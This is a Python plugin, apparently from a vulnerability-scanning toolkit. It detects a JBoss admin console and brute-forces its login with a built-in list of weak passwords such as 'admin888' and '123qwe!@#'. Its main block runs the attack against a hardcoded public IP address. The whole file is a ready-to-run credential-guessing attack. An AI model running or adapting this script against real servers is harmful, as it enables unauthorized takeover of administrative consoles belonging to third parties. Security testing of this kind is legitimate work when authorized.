# -*- coding:utf-8 -*-

import re
from exp.lib.httpparse import httpparse


psw = ('admin', '123456', '123456Aa','admin888','123123Aa','123qwe','123qweQWE','123qwe!@#')

def verify(protocol,ip,port):
    url = protocol+'://'+ip+':'+str(port)
    print('testing if JBOSS-adminConsole')
    http = httpparse()
    try:
        tm = http.httpreq('GET', protocol, ip, port, '/admin-console/index.seam')
        if re.search('jboss',str(tm[1]),re.I) and tm[0] == 200:
            #header = {"Cookie":"JSESSIONID=A04D33474CB89BA12F4DECA06F2B1003"}
            for password in psw:
                data = 'login_form=login_form&login_form%3Aname=admin&login_form%3Apassword='+password+'&login_form%3Asubmit=Login&javax.faces.ViewState=j_id4'
                data = data.encode(encoding='utf-8')
                tm = http.httpreq('POST', protocol, ip, port, '/admin-console/login.seam',data=data)
                if not re.search(b'attempt failed', tm[2], re.I):
                    msg = 'Found JBOSS-adminConsole! in url:'+url+'/admin-console/index.seam with password: '+password+'.'
                    print(msg)
                    number = 'v5'
                    return True,url,number,msg
            else:
                msg = 'Cannot found JBOSS-adminConsole! in url:'+url+'/admin-console/index.seam'
                number = 'v0'
                return False,url,number,msg
        else:
            msg = 'The url:'+url+'is not jboss'
            number = 'v0'
            return False,url,number,msg
    except Exception as e:
        print(e)
        msg = 'error'
        number = 'v0'
        return False,url,number,msg
    msg = 'There is no JBOSS-adminConsole weakpass vul on url'
    number = 'v0'
    return False,url,number,msg

if __name__ == '__main__':
    res = verify('http','223.202.25.77',80)
    print(res)